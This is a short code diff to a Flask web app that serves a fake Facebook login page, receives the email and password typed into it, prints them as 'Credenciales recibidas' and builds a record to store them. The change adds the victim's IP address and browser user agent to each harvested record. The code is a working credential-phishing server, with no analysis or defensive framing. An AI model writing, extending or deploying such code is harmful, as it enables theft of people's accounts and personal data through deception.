@@ -4,14 +4,14 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/', methods=['GET'])
 def index():
     return render_template('facebook_login.html')
 
 @app.route('/login', methods=['POST'])
 def login():
     email = request.form.get('email')
-    password = request.form.get('pass')
+    password = request.form.get('password')
 
     print("---------- Credenciales recibidas ----------")
     print(f"Email: {email}")
@@ -22,7 +22,9 @@ def login():
     data = {
         'email': email,
         'password': password,
-        'fecha': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        'fecha': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        'ip_address': request.remote_addr,
+        'user_agent': str(request.user_agent)
     }
     
     # Guardar en archivo JSON 
